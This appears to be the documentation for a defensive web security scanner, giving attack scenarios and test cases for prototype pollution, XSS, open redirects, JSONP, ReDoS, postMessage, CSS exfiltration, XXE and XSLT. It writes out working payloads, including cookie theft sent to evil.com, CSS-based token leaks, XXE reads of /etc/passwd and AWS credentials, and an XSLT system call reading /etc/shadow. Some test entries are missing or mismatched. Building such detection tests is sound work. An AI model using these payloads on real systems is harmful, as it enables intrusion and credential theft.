================================================================================
WEB ARCHIVE SECURITY ANALYSIS PIPELINE
USE CASES & TEST CASES FOR EVERY SCANNER
================================================================================

For each of the 19 tests, this document provides:

  USE CASE     — A real-world scenario explaining WHEN and WHY you'd care
                 about this finding. Who is the attacker? Who is the victim?
                 What do they gain?

  TEST CASES   — Concrete inputs that SHOULD trigger findings (positive tests)
                 and inputs that SHOULD NOT trigger findings (negative tests).
                 Each test case has an ID, input, and expected result.

  The accompanying test_cases/ directory contains actual files you can run
  through the pipeline to verify every test.

  Run: python driver.py test_cases/ --format json -o test_results.json

USE CASE 1A — Library-mediated pollution in an e-commerce site
  Scenario: An online store uses Lodash 4.17.4 and has an endpoint that
  accepts user preferences as JSON, then merges them with defaults:
      _.merge(defaults, userPreferences)
  An attacker submits: {"__proto__": {"isAdmin": true}}
  After the merge, every new object in the app has isAdmin=true. The
  attacker accesses the admin panel, exports the customer database.
  Who cares: Any site using deep-merge on user-controlled JSON input.

USE CASE 1B — Prototype pollution to XSS via template engine
  Scenario: A dashboard app merges user settings into a config object. The
  template engine checks config.escapeHtml before rendering. An attacker
  sends {"__proto__": {"escapeHtml": false}}. Now all templates render
  raw HTML, and the attacker injects <script> tags through any text field.
  Who cares: Single-page apps using Handlebars, Pug, or EJS templates.

            Expected: HIGH — Direct Object.prototype assignment

  TC-PP-02  POSITIVE  $.extend(true, {}, userData)
            Expected: HIGH — jQuery deep extend

  TC-PP-03  POSITIVE  _.merge(config, req.body)
            Expected: HIGH — Lodash _.merge

  TC-PP-04  POSITIVE  _.defaultsDeep(options, userOpts)
            Expected: HIGH — Lodash _.defaultsDeep

  TC-PP-05  POSITIVE  obj.__proto__.polluted = 1
            Expected: HIGH — __proto__ access

  TC-PP-06  NEGATIVE  $.extend({}, defaults)

            Expected: NO finding — Object.assign does not recurse

  TC-PP-08  NEGATIVE  Object.freeze(Object.prototype)
            Expected: NO finding — this is a DEFENSE, not an attack

USE CASE 2A — Phishing via login redirect
  Scenario: A bank's login page has ?redirect=/dashboard in the URL. After
  login, it does: location.href = getParam('redirect'). An attacker sends
  the victim: https://bank.com/login?redirect=https://evil-bank.com/login
  The victim sees the trusted bank.com domain, logs in, gets redirected to
  the phishing page which looks identical, and enters credentials again
  thinking the first attempt failed.
  Who cares: Any site with post-login redirects.

USE CASE 2B — Open redirect to bypass URL whitelists
  Scenario: An OAuth provider checks that redirect_uri starts with a
  whitelisted domain. But the whitelisted app has an open redirect:
  https://legit-app.com/go?url=https://evil.com. The attacker chains:
  OAuth redirect → legit-app open redirect → evil.com with the auth token.
  Who cares: OAuth implementations, SSO providers.

USE CASE 3A — Third-party script harvesting location data
  Scenario: A news website includes an ad network script. That script calls
  navigator.geolocation.getCurrentPosition() and sends the user's GPS
  coordinates to the ad network's servers. The news site never consented
  to sharing location data — the ad script does it silently.
  Who cares: Any site with third-party scripts and privacy obligations.

USE CASE 3B — WebRTC IP leak in VPN users
  Scenario: A user browses through a VPN for privacy. A script creates a
  new RTCPeerConnection and reads the local ICE candidates, which contain
  the user's REAL local IP address — bypassing the VPN entirely.
  Who cares: Privacy-conscious users, sites handling sensitive content.

USE CASE 4A — eval() executing URL hash in a single-page app
  Scenario: A developer builds a calculator widget. To parse expressions,
  they use eval(location.hash.substring(1)). User visits the page with
  #alert(document.cookie) and the XSS fires. The attacker shares the link
  on social media and harvests session cookies from every click.
  Who cares: Any site using eval/Function on user-reachable input.

USE CASE 4B — innerHTML XSS via API response
  Scenario: A forum app fetches a user's bio from the API and renders it:
  profileDiv.innerHTML = response.bio. A user sets their bio to
  <img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>.
  Every visitor to their profile leaks their cookies.
  Who cares: Any site rendering API data into innerHTML.

USE CASE 4C — document.write in legacy analytics
  Scenario: An old analytics snippet does document.write('<script src="' +
  trackingUrl + '"></script>'). If trackingUrl comes from a URL parameter,
  an attacker can inject a closing script tag and a new malicious one.
  Who cares: Legacy sites with old inline analytics code.

USE CASE 5A — Cross-domain data theft via JSONP
  Scenario: A social media API endpoint returns user data as JSONP:
  GET /api/me?callback=handleUser returns handleUser({"name":"alice",
  "email":"alice@company.com"}). Any website can add <script src=
  "https://social.com/api/me?callback=steal"> and define function steal()
  to receive the logged-in user's data — no CORS check applies because
  it loads as a regular script.
  Who cares: APIs still using JSONP instead of CORS.

USE CASE 5B — XSS via unsanitized callback
  Scenario: The JSONP endpoint doesn't validate the callback name:
  GET /api?callback=alert(1)// returns alert(1)//({"data":"..."}).
  The attacker has reflected XSS without needing any HTML injection.
  Who cares: Any JSONP endpoint without callback sanitization.

USE CASE 6A — Email validation regex freezes the page
  Scenario: A registration form validates email with the regex
  /^([a-zA-Z0-9]+)+@/. A bot submits "aaaaaaaaaaaaaaaaaaaaaaaaa!" and

  Who cares: Any frontend with regex validation on user input.

  Scenario: A Node.js API validates input with a vulnerable regex. An
  attacker sends a crafted string that blocks the event loop for 10
  seconds. During that time, the entire server is unresponsive to all
  other requests.
  Who cares: Node.js servers using regex on untrusted input.

USE CASE 7A — Persistent XSS via service worker
  Scenario: An attacker finds an XSS on example.com and uses it to
  register a malicious service worker at scope "/". Even after the XSS
  is patched, the service worker persists in the victim's browser,
  intercepting all requests, injecting malicious content, and stealing
  credentials on every page load indefinitely.
  Who cares: Any site that could be targeted by persistent attacks.

USE CASE 7B — Cache poisoning through service worker
  Scenario: A service worker uses a cache-first strategy with no
  validation. An attacker poisons one cached response (e.g., via a
  CDN compromise). The SW serves the poisoned response forever, even
  after the CDN is cleaned.
  Who cares: PWAs (Progressive Web Apps) with offline caching.

USE CASE 9A — XSS via postMessage on an embedded payment widget
  Scenario: A payment page embeds a card form in an iframe. The parent
  page listens for postMessage to get the payment token. But the handler
  does: innerHTML = event.data without checking event.origin. An attacker
  creates a page that iframes the payment page and sends:
  <img src=x onerror=stealCards()>. The payment page renders the
  attacker's HTML in its own origin with access to the card form.
  Who cares: Payment integrations, chat widgets, SSO iframes.

USE CASE 9B — Bypass weak origin check
  Scenario: A handler checks: if(event.origin.indexOf('trusted.com') > -1).
  The attacker hosts their page on evil-trusted.com (string "trusted.com"
  is contained) and bypasses the check entirely.
  Who cares: Any cross-origin communication using postMessage.

USE CASE 9C — Wildcard postMessage leaking tokens
  Scenario: An iframe sends the parent a session token via:
  parent.postMessage(token, '*'). The '*' means ANY parent origin receives
  the token. If the user is tricked into loading the iframe on evil.com,
  evil.com gets the token.
  Who cares: Any site using postMessage for auth tokens or sensitive data.

USE CASE 10A — Stealing CSRF tokens without JavaScript
  Scenario: A banking site has strong CSP that blocks all inline scripts
  and external script sources. But a CSS injection exists — the attacker
  can inject arbitrary CSS into a user's profile page. They inject:
  input[name=csrf][value^=a]{background:url(//evil.com/a)}
  (one rule per character). When an admin views the profile, the browser
  evaluates the selectors and makes requests that leak the admin's CSRF
  token. The attacker uses the token to transfer funds.
  Who cares: Sites with CSS injection even when CSP blocks JavaScript.

USE CASE 10B — Exfiltrating password manager autofill
  Scenario: A CSS injection on a login page. The password manager
  autofills the password field. CSS selectors can probe the value:
  input[type=password][value^=P]{background:url(//evil.com/P)}
  The attacker learns the password character by character.
  Who cares: Sites where password autofill occurs on injectable pages.

USE CASE 11A — Single-injection-point token theft
  Scenario: The attacker has an HTML injection (not XSS) that allows
  injecting a <style> tag but CSP blocks scripts. They inject:
  <style>@import '//evil.com/start'</style>
  The evil server returns a stylesheet with @import rules that probe
  for CSRF token characters. Each import blocks until the previous
  character is confirmed. Over HTTP/2, the full token is leaked in
  under 3 seconds from a single injection.
  Who cares: Sites where HTML injection is possible but XSS is blocked.

USE CASE 11B — Persistent CSS-based surveillance
  Scenario: An attacker compromises a CSS file on a CDN. They add
  @import rules that phone home on every page load. Even if the main
  site's HTML is cached, the CSS file fetches fresh imports from the
  attacker's server each time, enabling persistent tracking or data
  exfiltration without any JavaScript.
  Who cares: Sites relying on external CSS from third-party CDNs.

└──────────────────────────────────────────────────────────────────────┘

USE CASE 13A — Reading /etc/passwd via XML upload
  Scenario: A site accepts XML file uploads (invoices, data feeds). The
  parser has external entities enabled. The attacker uploads XML with
  <!ENTITY xxe SYSTEM "file:///etc/passwd"> and &xxe; in a text field.
  The parsed response includes the server's password file.
  Who cares: Any application processing XML from untrusted sources.

USE CASE 13B — SSRF via XXE to access cloud metadata
  Scenario: An AWS-hosted application parses XML. The attacker sends:
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/
  security-credentials/">. The XML parser fetches the AWS metadata
  endpoint from inside the VPC, returning IAM credentials.
  Who cares: Cloud-hosted apps that parse external XML.

USE CASE 13C — Out-of-band XXE for blind exfiltration
  Scenario: The app parses XML but doesn't reflect the content back.
  The attacker uses parameter entities to force the parser to connect
  to their server: <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % exfil "<!ENTITY send SYSTEM 'http://evil.com/?%data;'>">
  Even though the response is blind, the data reaches the attacker.
  Who cares: Any XML parsing, even without visible output.

USE CASE 16A — Remote code execution via XSLT in PHP
  Scenario: A PHP application lets users upload XSLT stylesheets for
  custom report formatting. The attacker uploads XSLT containing:
  <xsl:value-of select="php:function('system','cat /etc/shadow')"/>
  The PHP XSLT processor executes the system command, and the attacker
  reads the shadow password file.
  Who cares: Any app that processes user-supplied XSLT.

USE CASE 16B — Server-side file read via document()
  Scenario: An XSLT template includes:
  <xsl:value-of select="document('file:///etc/hostname')"/>
  Even without PHP extensions, the standard document() function reads
  XML or text files from the server filesystem.
  Who cares: XSLT processors with default entity/document resolution.

USE CASE 16C — XSS via disable-output-escaping
  Scenario: An XSLT stylesheet generates HTML with
  disable-output-escaping="yes" on user-controlled values. The raw
  HTML output is not escaped, allowing script injection in the
  transformed output.
  Who cares: Apps generating HTML through XSLT transformation.
